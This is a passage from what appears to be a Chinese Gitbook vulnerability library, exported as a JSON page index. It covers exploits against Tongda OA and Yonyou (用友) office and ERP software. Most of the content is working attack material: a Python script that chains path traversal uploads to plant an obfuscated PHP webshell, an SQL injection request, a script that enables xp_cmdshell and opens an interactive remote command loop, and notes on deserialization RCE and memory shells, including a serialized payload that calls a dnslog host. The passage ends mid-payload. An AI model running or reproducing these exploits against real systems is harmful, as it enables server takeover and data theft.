base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0idGVzdC5sb2ciCkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpbgoKPD9waHAgCmVjaG8gInRlc3RfV2lraSI7CiRwemtCPWNyZWF0ZV9mdW5jdGlvbihjaHIoMDEwMTc1MC8wMTY1MikuYmFzZTY0X2RlY29kZSgnY3c9PScpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5jaHIoOTkwODEvOTA5KS5jaHIoMDEwMjUtMDY2MCksY2hyKDA1MTctMDM1MikuY2hyKDB4MzQzLTB4MmNkKS5iYXNlNjRfZGVjb2RlKCdZUT09Jykuc3RyX3JvdDEzKCd5JykuYmFzZTY0X2RlY29kZSgnS0E9PScpLmJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoNDQ0LTMyOSkuYmFzZTY0X2RlY29kZSgnYnc9PScpLmNocig1OTctNDg4KS5jaHIoMHgxOWYtMHgxM2EpLmNocigyMTktMTc4KS5iYXNlNjRfZGVjb2RlKCdPdz09JykpOyRwemtCKGJhc2U2NF9kZWNvZGUoJ05EZzFOJy4nemMyTzAnLidCbGRrRicuJ3NLQ1JmJy4nJy5jaHIoODIxMTAvOTY2KS5iYXNlNjRfZGVjb2RlKCdSUT09Jykuc3RyX3JvdDEzKCc5JykuY2hyKDAxNTUwNjQvMDEyMzEpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5zdHJfcm90MTMoJ1MnKS5iYXNlNjRfZGVjb2RlKCdkQT09JykuYmFzZTY0X2RlY29kZSgnTUE9PScpLmNocig2MDc1MC82NzUpLmNocigwMTUwNy0wMTM1NykuJycuJ04wWFNrJy4nN01UUTEnLidOek15TycuJ0RzPScuJycpKTs/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQo=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/test \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 test.log 文件, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传 test.log 文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"test_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应中包含 test_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] 成功上传蚁剑木马 密码为: test \\n[o] webshell路径: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 test_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin\" POC_1(target_url, Cookie) [!NOTE] v11.8及以下可连接蚁剑生成的webshell控制,且生成后不需要管理员Cookie即可连接 import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 通达OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"PeiQi_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] 成功上传蚁剑木马 密码为: PeiQi \\n[o] webshell路径: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin\" POC_1(target_url, Cookie) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/通达OA/通达OA v11.9 后台SQL注入漏洞.html":{"url":"book/OA产品漏洞/通达OA/通达OA v11.9 后台SQL注入漏洞.html","title":"通达OA v11.9 后台SQL注入漏洞","keywords":"","body":"通达OA v11.9 后台SQL注入漏洞 漏洞描述 通达OA v11.9 及以下版本中由于某些参数过滤不完善导致后台存在SQL注入漏洞 漏洞影响 [!NOTE] 通达OA 环境搭建 https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe 双击安装 漏洞复现 漏洞文件位 webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php public function actionUpsharestatus() { Yii::$app->response->format = yii\\web\\Response::FORMAT_JSON; $data = modules\\appdesign\\models\\AppUtils::toGBK($_POST); if (modules\\portal\\controllers\\intval($data[\"uid\"]) == $_SESSION[\"LOGIN_UID\"]) { modules\\portal\\models\\PortalWorkbench::updateAll(array(\"state\" => \"{$data[\"status\"]}\"), \"id={$data[\"id\"]}\"); } else if ($data[\"status\"] == 1) { modules\\portal\\models\\PortalWorkbenchState::deleteAll(array(\"wids\" => \"{$data[\"id\"]}\", \"uid\" => \"{$_SESSION[\"LOGIN_UID\"]}\")); } else { $Work = new modules\\portal\\models\\PortalWorkbenchState(); $Work->wids = $data[\"id\"]; $Work->uid = $_SESSION[\"LOGIN_UID\"]; $Work->save(); } $dataBack = array(\"status\" => 1, \"msg\" => modules\\portal\\controllers\\_(\"操作成功\")); $dataBack = modules\\appdesign\\models\\AppUtils::toUTF8($dataBack); return $dataBack; } 其中 updateAll() 函数并没有使用防止 SQL注入的 sql_injection() 来防止注入 webroot/inc/conn.php 所以这里就出现了 id 参数存在注入的情况，请求包如下 POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1 Host: oa.tongda2000.com Connection: close Content-Length: 36 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Origin: https://oa.tongda2000.com Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://oa.tongda2000.com/general/appbuilder/web/portal/workbench/upsharestatus Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 uid=15&status=1&id=1;select sleep(4) 注意 uid参数 要为当前用户的uid才能完成请求，可以使用 burp 遍历查看时间响应 例如这里使用官网的测试账户 uid 遍历出为 15 如果uid错误则不会出现时间延迟，将请求包放入 Sqlmap跑一下 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/用友OA/":{"url":"book/OA产品漏洞/用友OA/","title":"用友OA","keywords":"","body":"用友 用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923 用友 NC bsh.servlet.BshServlet 远程命令执行漏洞 用友 NC 反序列化RCE漏洞 用友 NC XbrlPersistenceServlet反序列化 用友 U8 OA test.jsp SQL注入漏洞 用友ERP-NC 目录遍历漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/用友OA/用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923.html":{"url":"book/OA产品漏洞/用友OA/用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923.html","title":"用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923","keywords":"","body":"用友GRP-U8行政事业财务管理软件 SQL注入 CNNVD-201610-923 漏洞描述 用友GRP-u8存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有进制外部实体的加载，导致可加载外部SQL语句，以及命令执行 影响版本 [!NOTE] 用友GRP-U8行政事业内控管理软件（新政府会计制度专版） FOFA [!NOTE] title=\"用友GRP-U8行政事业内控管理软件\" 漏洞复现 漏洞利用POC请求包 POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=XML AS_DataRequest ProviderNameDataSetProviderData Dataselect @@version 请求后按F12查看源代码可以得到SQL语句查询结果 也可以调用 xp_cmdshell 来执行系统命令(大部分此系统为windows) [!NOTE] 注意：大部分默认是不开启 xp_cmdshell 模块的 可以使用如下方法打开xp_cmdshell方法 将如下POST数据按顺序发送(注意 master 改为当前数据库名) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatause master cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'show advanced options',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'xp_cmdshell',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure [!NOTE] 发送如上实际为执行SQL语句打开 xp_cmdshell use master; exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; 再发送以下数据可成功使用(也可能失败) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\" [!NOTE] 执行过程中报错 java.sql.SQLException【错误代码: 0; 相关信息:xxxxxx】不用理会 发送请求后再使用此模块则会成功请求执行系统命令 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 用友GRP-U8行政事业内控管理软件 \\033[0m') print('+ \\033[36m使用格式: python3 CNNVD-201610-923.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36m(Y/N) >>> Y or N \\033[0m') print('+ \\033[36mcmd >>> ipconfig \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataselect 1,user,db_name(),host_name(),@@version\"\"\" try: print(\"\\033[32m[o] 正在执行SQL语句:select 1,user,db_name(),host_name(),@@version...\\033[0m\") response = requests.post(url=check_url, headers=headers, data=data, timeout=10) row_1 = '> 数据库用户为:{}\\033[0m\".format(db_user)) print(\"\\033[32m >> 数据库名为:{}\\033[0m\".format(db_name)) print(\"\\033[32m >> 数据库主机名为:{}\\033[0m\".format(db_host)) print(\"\\033[32m >> 数据库版本为:{}\\033[0m\".format(db_vers)) return db_name else: print(\"\\033[31m[x] 漏洞已被修复 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) def xp_cmdshell_open(target_url, db_name): open_sql = [\"use {}\".format(db_name),\"exec sp_configure 'show advanced options',1\",\"reconfigure\",\"exec sp_configure 'xp_cmdshell',1\",\"reconfigure\"] num = 1 for sql in open_sql: open_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataData{}'.format(sql) try: print(\"\\033[32m[o] 正在执行SQL语句:{}...\\033[0m\".format(sql)) response = requests.post(url=open_url, headers=headers, data=data, timeout=10) num = num + 1 if num == 5 : POC_2(target_url, db_name) except: print(\"\\033[31m[x] 开启 xp_cmdsheall 失败 \\033[0m\") sys.exit(0) def POC_2(target_url, db_name): db_name = db_name sql_cmd_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\"\"\"\" try: print(\"\\033[32m[o] 正在执行SQL语句:exec xp_cmdshell 'whoami'...\\033[0m\") response = requests.post(url=sql_cmd_url, headers=headers, data=data, timeout=10) if 'exec xp_cmdshell' in response.text: print(\"\\033[31m[x] 数据库未开启 xp_cmdshell 模块\\033[0m\") sqlcmd_open = str(input(\"\\033[35m是否开启 xp_cmdshell\\n(Y/N) >>> \\033[0m\")) if sqlcmd_open == 'Y' or sqlcmd_open == 'y': xp_cmdshell_open(target_url, db_name) else: print(\"\\033[31m[x] 停止开启 xp_cmdshell \\033[0m\") sys.exit(0) else: whoami = re.findall(r'output=\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] 成功执行SQL语句:exec xp_cmdshell 'whoami'...\\n>>> {}\\033[0m\".format(whoami)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, cmd): vuln_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"{}\"'.format(cmd) try: print(\"\\033[32m[o] 正在执行SQL语句:exec xp_cmdshell '{}'...\\033[0m\".format(cmd)) response = requests.post(url=vuln_url, headers=headers, data=data, timeout=10) data = re.findall(r'output=\"(.*?)\"', response.text) for i in data: print(\"\\033[32m >>> {}\\033[0m\".format(i)) except Exception as e: print(\"\\033[31m[x] 请求失败:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) db_name = POC_1(target_url) POC_2(target_url, db_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_3(target_url, cmd) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/用友OA/用友 NC 反序列化RCE漏洞.html":{"url":"book/OA产品漏洞/用友OA/用友 NC 反序列化RCE漏洞.html","title":"用友 NC 反序列化RCE漏洞","keywords":"","body":"用友 NC 反序列化RCE漏洞 漏洞描述 用友NC 存在反序列化 RCE漏洞，攻击者可利用控制服务器 漏洞影响 [!NOTE] 用友 NC 漏洞复现 首先从任意文件上传说起 任意文件上传分析代码在servlet.FileReceiveServlet。在这里我们可以看到，从请求中读取流，然后转换为map类型并读取上传文件的路径。然后再读取待上传的文件。 而网上很多poc，大多都是基于此漏洞，利用反序列化上传一个文件到服务器。 这也就是去年的那个任意文件上传的反序列化漏洞。但是，但是，这个漏洞本质是一个反序列化漏洞。而且某C的classpath中，也存在apache commonscollections库，我们可以利用这个库，直接执行命令或者内存马。岂不是比任意文件上传舒服多了。 内存马 老样子，在反序列化中想执行任意代码，一般都依靠xalan这个库。这次也不例外。 植入内存马，关键在于我们怎样找到context，只有找到context，我们才可以添加filter。好在某c中，我们只需要通过下面的代码既可以获取当前context，不需要从tomcat中获取context Object obj = 改动Locator.getInstance().lookup(\"ServletContext\"); Field contextField = obj.getClass().getDeclaredField(\"context\"); contextField.setAccessible(true); obj = contextField.get(obj); Field contextField1 = obj.getClass().getDeclaredField(\"context\"); contextField1.setAccessible(true); addFitlertoTomcat(contextField1.get(obj)); 剩下的就是常规操作，可以看我之前的内存马模型，基本不需要很大的改动即可完美适配。 回显 我们只需要找到这样一个servlet，即存在反序列化的readObject，又将错误信息写入到response中 不难看出 uploadServlet 就很满足这个需求。 out = new ObjectOutputStream(output); in = new ObjectInputStream(request.getInputStream()); String dsName = (String)in.readObject(); } } catch (Exception var14) { var14.printStackTrace(); if (out == null) { throw new ServletException(var14); } out.writeObject(var14); 如果出错的话，将错误信息通过序列化写入到response中。好处在于，我们不需要麻烦的去找tomcat的response对象。 所以，我们将反序列化的payload，发送给uploadServlet即可。然后我们只需要读取响应，即可拿到服务器命令执行的回显结果。客户端代码可以这样写 ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(r)); Exception e = (Exception) objectInputStream.readObject(); Object obj = e.getCause(); Field targetF = obj.getClass().getDeclaredField(\"target\"); targetF.setAccessible(true); obj = targetF.get(obj); Field msgF = obj.getClass().getSuperclass().getDeclaredField(\"detailMessage\"); msgF.setAccessible(true); String msg = msgF.get(obj).toString(); System.out.println(msg); 参考文章 https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/OA产品漏洞/用友OA/用友 NC XbrlPersistenceServlet反序列化.html":{"url":"book/OA产品漏洞/用友OA/用友 NC XbrlPersistenceServlet反序列化.html","title":"用友 NC XbrlPersistenceServlet反序列化","keywords":"","body":"用友 NC XbrlPersistenceServlet反序列化 漏洞描述 用友 NC XbrlPersistenceServlet反序列化漏洞 漏洞影响 [!NOTE] 用友NC 漏洞复现 攻击队利用用友nc反序列利用 目前测试影响版本：nc6.5 漏洞url为： /service/~xbrl/XbrlPersistenceServlet poc： import requests import threadpool import urllib3 import sys import base64 ip = \"\" dnslog = \"\\x79\\x37\\x64\\x70\\\" #dnslog把字符串转16进制替换该段，测试用的ceye.io可以回显 data = \"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x01\\x73\\x72\\x00\\x0c\\x6a\\x61\\x76\\x61\\x2e\\x6e\\x65\\x74\\x2e\\x55\\x52\\x4c\\x96\\x25\\x37\\x36\\x1a\\xfc\\xe4\\x72\\x03\\x00\\x07\\x49\\x00\\x08\\x68\\x61\\x73\\x68\\x43\\x6f\\x64\\x65\\x49\\x00\\x04\\x70\\x6f\\x72\\x74\\x4c\\x00\\x09\\x61\\x75\\x74\\x68\\x6f\\x72\\x69\\x74\\x79\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x04\\x66\\x69\\x6c\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x04\\x68\\x6f\\x73\\x74\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x70\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x03\\x72\\x65\\x66\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x50\\x74\\x00\\x11\"+dnslog+\"\\x3a\\x38\\x30\\x74